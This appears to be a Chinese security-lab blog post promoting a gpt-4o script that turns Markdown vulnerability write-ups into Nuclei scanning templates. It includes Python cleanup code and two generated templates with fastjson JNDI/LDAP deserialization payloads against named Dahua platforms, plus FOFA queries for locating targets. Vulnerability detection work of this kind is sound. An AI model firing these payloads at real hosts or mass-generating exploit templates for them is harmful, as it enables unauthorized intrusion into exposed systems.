#  还在手撸 POC？这个 AI 脚本让你直接起飞！   
原创 泰阿安全实验室  泰阿安全实验室   2025-01-01 14:29  
  
**前言**  
  
  
好久不见,各位朋友们.恰逢新的一年,送个小见面礼给各位,以弥补长期未更新的错.兜兜转转已经3-4年过去了,看着公众号后台有人关注亦有人取关,何尝不是人生百态.新的一年我会重新分配精力在公众号上分享更优质的内容给关注的朋友们.更多会是倾向AI 安全,AI 工作流,AI 编程,出海,数据安全等方面领域内容.敬起期待.下面上干货!  
  
  
  
**深夜痛点：你还在熬夜手撸 POC 吗？**  
  
  
是不是经常在深夜，被漏洞报告和手撸 POC 折磨得头疼？一个漏洞两三天，复杂点的直接一周，效率低到爆炸！你是不是也渴望有一个工具，能自动生成 POC，让你早点下班？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/BibeFvVBkRA9KMJGiakzzA9E3YrrBt3XsOaO2RX3aaxibbibcA1licHE9SIOiapEMKsPgWzkTq1re9sFqHIzAYnX9Xkw/640?wx_fmt=gif&from=appmsg "")  
  
  
别急，今天就给你带来一个神器——**AI 自动化 POC 开发脚本**  
，让你直接起飞！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/BibeFvVBkRA9KMJGiakzzA9E3YrrBt3XsOx7vv8LSWlrKkHN9JTmDAjNB9h7Pcb2ysPzyGKGIrV6AYFyNUazzTSw/640?wx_fmt=gif&from=appmsg "")  
  
  
**一键起飞：告别手撸时代**  
  
  
这个脚本就像一个安全界的“自动驾驶”，它能自动解析 Markdown 格式的 POC 文档，然后利用 OpenAI 的 gpt-4o 模型，秒速生成符合 Nuclei 框架的 YAML 模板。想象一下，以后再也不用熬夜手撸 POC 了！  
  
  
**技术揭秘：AI 是如何施展魔法的？**  
  
  
这个脚本的“魔法”源自以下几个技术：  
- **OpenAI API：**  
 gpt-4o 模型就像你的私人助手，能快速理解漏洞文档。  
  
- POC来源:(开源漏洞文库:https://github.com/wy876/POC,感谢开源作者)  
  
- **Markdown 解析：**  
 像一个高效的阅读器，快速提取漏洞信息。  
  
- **Nuclei 模板生成：**  
 根据信息，自动生成 YAML 模板。  
  
- **请求构造：**  
 将 HTTP 请求转换为 YAML，准确无误。  
  
- **动态值处理：**  
 自动使用 {{Hostname}}、{{interactsh-url}} 等，保证模板的通用性。  
  
- **Matchers 配置：**  
 自动配置匹配器，精准检测漏洞。  
  
- **YAML 处理：**  
  
- 这段代码就像一个“格式化大师”，确保 YAML 格式的正确。  
  
- **重要性：**  
 YAML 格式直接影响模板的有效性。  
  
- **关键代码：**  
```
def save_template(self, template_content, output_path):    try:        # 清理 AI 返回的内容        cleaned_content = template_content.strip()        # 移除所有可能的 markdown 代码块标记        cleaned_content = re.sub(r'^```ya?ml\s*\n', '', cleaned_content, flags=re.MULTILINE)        cleaned_content = re.sub(r'^```\s*\n', '', cleaned_content, flags=re.MULTILINE)        cleaned_content = re.sub(r'\n```\s*$', '', cleaned_content)                # 移除 markdown 格式的注释和说明        cleaned_content = re.sub(r'^\*\*.*?\*\*.*$', '', cleaned_content, flags=re.MULTILINE)        cleaned_content = re.sub(r'^>.*$', '', cleaned_content, flags=re.MULTILINE)        cleaned_content = re.sub(r'^Note:.*$', '', cleaned_content, flags=re.MULTILINE)        # 处理 YAML 中的特殊字符        def fix_yaml_string(match):            value = match.group(1)            # 如果字符串包含单引号，使用双引号            if "'" in value:                return f'"{value}"'            return match.group(0)        # 处理正则表达式中的特殊字符        def fix_regex_pattern(match):            pattern = match.group(1)            # 转义所有特殊字符            pattern = pattern.replace('\\', '\\\\')  # 首先转义反斜杠            pattern = pattern.replace('.', '\\.')    # 转义点号            pattern = pattern.replace('[', '\\[')    # 转义方括号            pattern = pattern.replace(']', '\\]')    # 转义方括号            pattern = pattern.replace('(', '\\(')    # 转义圆括号            pattern = pattern.replace(')', '\\)')    # 转义圆括号            pattern = pattern.replace('|', '\\|')    # 转义竖线            pattern = pattern.replace('+', '\\+')    # 转义加号            pattern = pattern.replace('*', '\\*')    # 转义星号            pattern = pattern.replace('?', '\\?')    # 转义问号            pattern = pattern.replace('{', '\\{')    # 转义花括号            pattern = pattern.replace('}', '\\}')    # 转义花括号            pattern = pattern.replace('^', '\\^')    # 转义脱字符            pattern = pattern.replace('$', '\\$')    # 转义美元符号            return f'"{pattern}"'                # 清理不可打印字符        cleaned_content = ''.join(char for char in cleaned_content if char.isprintable())                # 修复包含正则表达式的字符串        cleaned_content = re.sub(r'"([^"]*[\\[\]().|+*?{}^$]+[^"]*)"', fix_regex_pattern, cleaned_content)                # 修复 fofa-query 和其他包含特殊字符的字符串        cleaned_content = re.sub(r"'([^']*)'", fix_yaml_string, cleaned_content)        # 规范化换行符        cleaned_content = cleaned_content.replace('\r\n', '\n').replace('\r', '\n')                # 移除空行但保持基本格式        lines = []        for line in cleaned_content.splitlines():            stripped = line.rstrip()            if stripped or any(key in line for key in ['id:', 'info:', 'http:', 'matchers:', '-']):                lines.append(stripped)                cleaned_content = '\n'.join(lines)                # 确保内容以换行符结尾        if not cleaned_content.endswith('\n'):            cleaned_content += '\n'        # 验证 YAML 格式        try:            yaml.safe_load(cleaned_content)        except yaml.YAMLError as e:            print(f"YAML validation error: {e}")            print("Problematic content:")            print(cleaned_content)            return False        # 写入文件        with open(output_path, 'w', encoding='utf-8') as f:            f.write(cleaned_content)        return True    except Exception as e:        print(f"Error saving template: {e}")        return False
```  
  
  
**效率爆炸：几秒搞定一个 POC**  
  
  
你只需要把 Markdown 文件丢给它，几秒钟，YAML 模板就自动生成了！  
  
  
以前需要半小时甚至更久的工作，现在只需几秒！  
  
  
**实战案例：漏洞无所遁形**  
  
  
- **案例一：大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞**  
  
- **漏洞故事：**  
 deleteFtp 接口的漏洞，像一扇没锁的门，攻击者能远程执行命令。  
  
- **Fofa 搜索：**  
 body="src=/WPMS/asset/common/js/jsencrypt.min.js"  
  
- **漏洞原理：**  
 通过构造恶意 JSON，利用 dataSourceName 指定恶意 LDAP 服务器。  
  
- **脚本操作：**  
 读取 Markdown 文档，自动生成 Nuclei 模板。  
  
- **生成的 YAML 模板：**  
```
id: dahua-smart-management-platform-deleteftp-rceinfo:  name: Dahua Smart Management Platform deleteFtp Remote Command Execution  author: nucleiexpert  severity: critical  description: |    A remote command execution vulnerability in the Dahua Smart Management Platform via the deleteFtp endpoint allows for external LDAP interactions and potential RCE.  tags: rce,fastjsonmetadata:  fofa-query: 'body="src=/WPMS/asset/common/js/jsencrypt.min.js"'http:  - raw:      - |        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1        Host: {{Hostname}}        Cache-Control: max-age=0        Upgrade-Insecure-Requests: 1        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36"        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7        Accept-Encoding: gzip, deflate, br        Accept-Language: zh-CN,zh;q=0.9        Cookie: yourCookie        Connection: close        Content-Type: application/json        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}    matchers-condition: and    matchers:      - type: status        status:          - 200      - type: dns        part: interactsh_protocol        words:          - "dns"
```  
  
  
- **验证：**  
 配合 DNSLog，验证漏洞是否真实存在。  
  
- **案例二：大华ICC智能物联综合管理平台 fastjson 漏洞**  
  
- **漏洞故事：**  
 fastjson 的反序列化漏洞，像一个隐藏的陷阱，攻击者能远程执行代码。  
  
- **Fofa 搜索：**  
 body="客户端会小于800  
"  
  
- **漏洞原理：**  
 利用 java.net.URL 指定恶意 URL，触发 JNDI 注入。  
  
- **脚本操作：**  
 读取 Markdown 文档，自动生成 Nuclei 模板。  
  
- **生成的 YAML 模板：**  
```
id: dahua-icc-fastjson-rceinfo: name: Dahua ICC Fastjson RCE author: nucleiexpert severity: critical description: |   The Dahua ICC Intelligent IoT Management Platform has a fastjson deserialization vulnerability that can lead to Remote Code Execution (RCE). tags: rce, fastjson, iotmetadata: fofa-query: 'body="*客户端会小于800*"'http: - raw:     - |       POST /evo-runs/v1.0/auths/sysusers/random HTTP/2       Host: {{Hostname}}       User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"       Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"       Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"       Accept-Encoding: "gzip, deflate"       Upgrade-Insecure-Requests: "1"       Sec-Fetch-Dest: "document"       Sec-Fetch-Mode: "navigate"       Sec-Fetch-Site: "none"       Sec-Fetch-User: "?1"       Te: "trailers"       Content-Type: "application/json"       {         "a": {           "@type": "com.alibaba.fastjson.JSONObject",           "@type": "java.net.URL",           "val": "http://{{interactsh-url}}"         }       }   matchers-condition: and   matchers:     - type: status       status:         - 200     - type: dns       part: interactsh_protocol       words:         - "dns"
```  
  
  
- **验证：**  
 配合 DNSLog，验证漏洞是否存在。  
  
**记住：自动化不是万能的**  
  
  
虽然自动化脚本很强大，但它不是万能药。面对复杂的漏洞，还需要我们安全人员的专业知识。同时也要注意，不要被滥用！  
  
  
**总结：解放双手，拥抱未来**  
  
  
  
这个自动化脚本，能让你从重复劳动中解放出来，把更多时间投入到更有价值的工作中。它不是用来取代你，而是用来解放你！  
  
  
**行动起来**  
  
- **已生成的截止12.28开源漏洞库更新的所有漏洞文档.**  
  
- **有些POC还是有些小问题,各位师傅可以人工看一下做完善,正好也学习一下Nuclei的开发规范.**  
  
- **对应的1300+POC下载地址：关注公众号后台发送 AIPOC 关键字,免费获取(新年送给各位的小礼物,麻烦同行取的人不要再拿去作为收费内容发布,谢谢).**  
  
- AI全自动Poc脚本:目前只适配开源漏洞文库,还有有一点点bug,需要自己再去完善增强,不做售后,自己多动手学习,可以通过自愿赞助方式获取,金额不低于20元(花费了大量 OpenAi Token 写出来的,让我回个本,  
全凭自愿哈  
).  
  
- 赞助的朋友,后台可以私信我进行获取.  
  
part1  
  
  
点击下方名片  
关注我们  
  
  
  
  
  
